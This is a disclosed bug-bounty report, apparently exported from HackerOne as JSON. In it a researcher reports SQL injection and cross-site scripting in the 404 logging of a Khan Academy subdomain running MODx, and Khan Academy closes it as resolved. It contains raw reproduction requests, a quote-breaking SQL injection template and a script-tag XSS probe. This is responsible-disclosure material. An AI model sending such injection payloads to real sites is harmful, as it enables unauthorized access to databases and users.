{"id":31023,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zMTAyMw==","url":"https://hackerone.com/reports/31023","title":"Sql injection And XSS","state":"Closed","substate":"resolved","readable_substate":"Resolved","created_at":"2014-10-11T13:47:27.346Z","submitted_at":"2014-10-11T13:47:27.346Z","is_member_of_team?":false,"reporter":{"disabled":true,"username":"jayden","url":"/jayden","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":134,"url":"https://hackerone.com/khanacademy","handle":"khanacademy","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Khan Academy","twitter_handle":"","website":"https://www.khanacademy.org/","about":"Start learning now. Completely free, forever."}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2015-12-08T16:47:16.135Z","bug_reporter_agreed_on_going_public_at":"2015-11-08T16:47:02.158Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"Hi , \r\n##Sql lnjection\r\nto reproduce the issue make this request  , just copy it to burp repeater and don't add any other headers .\r\n\r\nGET /Campin/jeatest' HTTP/1.1\r\nHost: smarthistory.khanacademy.org\r\nAccept: */*\r\nAccept-Language: en\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\nConnection: close\r\n\r\nsimple response  : \r\n\r\nINSERT INTO `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES ('/Campin/jeatest'','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 07:51:13')\u003c/span\u003e\u003c/b\u003e\r\n\r\n##To confirm Sql \r\nthe error is shown by MODx , the sql injection happens when a user request a page that doesnt exist then MODx log the request with some others details (ip,host..) . \r\n\r\nthe following injection works  \r\n/Campin/qsdqsd',(commands here),1,1,1)#    \r\n\r\ni couldn't do more tests because there is a timeout  (Error 503 Service Unavailable due to many requests , btw its really a slow server)\r\n   Timeout in transmission from smarthistory.khanacademy.org\r\n\r\n## XSS\r\n\r\nGET /Campin/jeatest'\"\u003e\u003cscript\u003ealert(4);\u003c/script\u003e HTTP/1.1\r\nHost: smarthistory.khanacademy.org\r\nAccept: */*\r\nAccept-Language: en\r\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\r\nConnection: close\r\n\r\nresponse \r\n\r\n   ing to parse the requested resource:\u003c/td\u003e\u003c/tr\u003e\r\n    \u003ctr\u003e\u003ctd colspan='3'\u003e\u003cb style='color:red;'\u003e\u0026laquo; Execution of a query to the database       failed - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\"\u003e\u003cscript\u003ealert(4);\u003c/script\u003e','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazon' at line 1 \u0026raquo;\u003c/b\u003e\u003c/td\u003e\u003c/tr\u003e\u003ctr\u003e\u003ctd colspan='3'\u003e\u003cb style='color:#999;font-size: 9px;'\u003e\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;\u0026nbsp;SQL:\u0026nbsp;\u003cspan id='sqlHolder'\u003eINSERT INTO `hzadofss_modx`.`error_404_logger` (url, ip, host, referer, createdon) VALUES ('/Campin/jeatest'\"\u003e\u003cscript\u003ealert(4);\u003c/script\u003e','107.23.39.46', 'ec2-107-23-39-46.compute-1.amazonaws.com', '', '2014-10-11 08:01:23')\u003c/span\u003e\u003c/b\u003e\r\n\r\n\r\n\r\n\r\n","vulnerability_information_html":"\u003cp\u003eHi , \u003c/p\u003e\n\n\u003ch2 id=\"sql-lnjection\"\u003eSql lnjection\u003c/h2\u003e\n\n\u003cp\u003eto reproduce the issue make this request  , just copy it to burp repeater and don\u0026#39;t add any other headers .\u003c/p\u003e\n\n\u003cp\u003eGET /Campin/jeatest\u0026#39; HTTP/1.1\u003cbr\u003e\nHost: smarthistory.khanacademy.org\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nAccept-Language: en\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\u003cbr\u003e\nConnection: close\u003c/p\u003e\n\n\u003cp\u003esimple response  : \u003c/p\u003e\n\n\u003cp\u003eINSERT INTO \u003ccode\u003ehzadofss_modx\u003c/code\u003e.\u003ccode\u003eerror_404_logger\u003c/code\u003e (url, ip, host, referer, createdon) VALUES (\u0026#39;/Campin/jeatest\u0026#39;\u0026#39;,\u0026#39;107.23.39.46\u0026#39;, \u0026#39;ec2-107-23-39-46.compute-1.amazonaws.com\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;2014-10-11 07:51:13\u0026#39;)\u0026lt;/span\u0026gt;\u0026lt;/b\u0026gt;\u003c/p\u003e\n\n\u003ch2 id=\"to-confirm-sql\"\u003eTo confirm Sql\u003c/h2\u003e\n\n\u003cp\u003ethe error is shown by MODx , the sql injection happens when a user request a page that doesnt exist then MODx log the request with some others details (ip,host..) . \u003c/p\u003e\n\n\u003cp\u003ethe following injection works\u003cbr\u003e\u003cbr\u003e\n/Campin/qsdqsd\u0026#39;,(commands here),1,1,1)#    \u003c/p\u003e\n\n\u003cp\u003ei couldn\u0026#39;t do more tests because there is a timeout  (Error 503 Service Unavailable due to many requests , btw its really a slow server)\u003cbr\u003e\n   Timeout in transmission from smarthistory.khanacademy.org\u003c/p\u003e\n\n\u003ch2 id=\"xss\"\u003eXSS\u003c/h2\u003e\n\n\u003cp\u003eGET /Campin/jeatest\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(4);\u0026lt;/script\u0026gt; HTTP/1.1\u003cbr\u003e\nHost: smarthistory.khanacademy.org\u003cbr\u003e\nAccept: \u003cem\u003e/\u003c/em\u003e\u003cbr\u003e\nAccept-Language: en\u003cbr\u003e\nUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)\u003cbr\u003e\nConnection: close\u003c/p\u003e\n\n\u003cp\u003eresponse \u003c/p\u003e\n\n\u003cp\u003eing to parse the requested resource:\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u003cbr\u003e\n    \u0026lt;tr\u0026gt;\u0026lt;td colspan=\u0026#39;3\u0026#39;\u0026gt;\u0026lt;b style=\u0026#39;color:red;\u0026#39;\u0026gt;« Execution of a query to the database       failed - You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near \u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(4);\u0026lt;/script\u0026gt;\u0026#39;,\u0026#39;107.23.39.46\u0026#39;, \u0026#39;ec2-107-23-39-46.compute-1.amazon\u0026#39; at line 1 »\u0026lt;/b\u0026gt;\u0026lt;/td\u0026gt;\u0026lt;/tr\u0026gt;\u0026lt;tr\u0026gt;\u0026lt;td colspan=\u0026#39;3\u0026#39;\u0026gt;\u0026lt;b style=\u0026#39;color:#999;font-size: 9px;\u0026#39;\u0026gt;      SQL: \u0026lt;span id=\u0026#39;sqlHolder\u0026#39;\u0026gt;INSERT INTO \u003ccode\u003ehzadofss_modx\u003c/code\u003e.\u003ccode\u003eerror_404_logger\u003c/code\u003e (url, ip, host, referer, createdon) VALUES (\u0026#39;/Campin/jeatest\u0026#39;\u0026quot;\u0026gt;\u0026lt;script\u0026gt;alert(4);\u0026lt;/script\u0026gt;\u0026#39;,\u0026#39;107.23.39.46\u0026#39;, \u0026#39;ec2-107-23-39-46.compute-1.amazonaws.com\u0026#39;, \u0026#39;\u0026#39;, \u0026#39;2014-10-11 08:01:23\u0026#39;)\u0026lt;/span\u0026gt;\u0026lt;/b\u0026gt;\u003c/p\u003e\n","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2015-12-08T16:47:02.434Z","allow_singular_disclosure_after":-159626667.109871,"singular_disclosure_allowed":true,"vote_count":1,"voters":["sameerphad72"],"structured_scope":null,"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":140661,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"pics","markdown_message":"\u003cp\u003epics\u003c/p\u003e\n","automated_response":false,"created_at":"2014-10-11T14:06:19.656Z","updated_at":"2014-10-11T14:06:19.656Z","actor":{"username":"jayden","cleared":false,"url":"/jayden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"attachments":[{"id":18588,"filename":"Screenshot_1.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/018/588/e800f0753481cc6da2e10950834288af04798307/Screenshot_1.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_1.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_1.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053129Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=6416cd6bbb576a2c2da8f54ddf2694291ac78765939e0414fe6cf7189119531d"},{"id":18589,"filename":"Screenshot_2.png","type":"image/png","url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/018/589/6468570e1d56dadd56f7ca44bd7e4c91f092bcd4/Screenshot_2.png?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ3ORU3ZNE%2F20201229%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20201229T053129Z\u0026X-Amz-Expires=3600\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJGMEQCIBDRduU%2FQiKN2Hy3Cc%2BFdvYldnR%2BI9yQ0JWu5Nd0q2n7AiBT09NYT9NM%2FNa1T7X7mPFfQEFunNsAbPoVngTqyDCvlCq0AwhSEAEaDDAxMzYxOTI3NDg0OSIMjho0%2F2dG4425KWNaKpEDfRP2JVIKEZKe%2Fu1DRJDnMt1hodmiYRHSHxVJXvZvnhQp68RTbgsA5dtRAFzhCl2p7oJWn2DfsUhN61oqH1cme2ydNbTr6cDG5AkVoiUMnjHvkMPTgbPahrduPs%2FdXuwFoyZMuPeBtzUlpjssIk0BfcIUtph2FGwzCuy6d0CQhdl914kkFpuTBp69z2htWslZiifdNkKWK0DIJcK%2FrSurcsk8WEaPiZ7tEJAcfYZS4SddR8orMY%2BhEfGsLc5RSVBGXY0UW6zTNw%2BYg82wPCY1Z9kgrjwVLQPpVTje3rfzRO3UEDh0xbd54m7t%2FSL0yItTAuaGshQmPLuW6S%2F5KOdoWWnwCmkruRqE1ZKMsnSko5gBnNELay%2BWeukQAQ6EyIB%2FWB06%2F%2FaYfBiWUzjgZyKRGg99IBpEO3zShFTod3huOdptlvO4PfWBvrB4632o9feKKn5CXqJUOE%2BTT%2BgjHEdWRLP2W3GZAibuc%2FbOIfOwee7%2Bn9cOimwp8NVS4U08VlgiSfhcWXonWb3aOkvnOfX46QkwoP6p%2FwU67AFSjWFI11fWgLkInKyx6Dx9AePw1c4qVefioOdfVonnQ3dNW7fXwjlRC5F1185jkAwhyCARy9%2F7sIPFHaI%2FEID5osYCwdvVwv0O6pPIknWS%2FVG7rXxUIgYk0xp3ln2eURcIkz%2F20YEsL73kMrgQLn%2BEd3AiGH%2F9wW5PEZOVPNqagqBYtUSWzNl9%2BrKCkhyVg8k79SdRjUkvdYLXtvxU1m6oAu2IjxFOCgwXqn1jFH1Lloh4Gp%2Fkq68ckYZB67%2B%2FdOzejM9ofYNi%2BpJRLwSwwu22w857sj9E%2BbC8Ei9i7KZOZGBCWe81d9lycwAH6Q%3D%3D\u0026X-Amz-Signature=13ddcf07cba3d992d1e70c4053cdebc8ca8cd86e238b02b742388b60d8ae21b8"}],"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":176793,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Guys ? ","markdown_message":"\u003cp\u003eGuys ? \u003c/p\u003e\n","automated_response":false,"created_at":"2014-12-11T19:15:01.863Z","updated_at":"2014-12-11T19:15:01.863Z","actor":{"username":"jayden","cleared":false,"url":"/jayden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":319225,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Thanks for reporting.  We no longer use the third-party blog software used at smarthistory when this was reported.","markdown_message":"\u003cp\u003eThanks for reporting.  We no longer use the third-party blog software used at smarthistory when this was reported.\u003c/p\u003e\n","automated_response":false,"created_at":"2015-01-27T21:33:39.556Z","updated_at":"2015-01-27T21:33:39.556Z","actor":{"username":"jpbetz","cleared":false,"url":"/jpbetz","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"jayden","url":"/jayden"},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":650108,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-11-08T16:47:02.204Z","updated_at":"2015-11-08T16:47:02.204Z","first_to_agree":true,"actor":{"username":"jayden","cleared":false,"url":"/jayden","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":712944,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2015-12-08T16:47:16.174Z","updated_at":"2015-12-08T16:47:16.174Z","actor":{"url":"/khanacademy","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/134/e62a822e39ad039f23a0b89bfaaaf7bf97c5f11f_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Khan Academy"}},"genius_execution_id":null,"team_handle":"khanacademy","actor_is_team_member":false,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}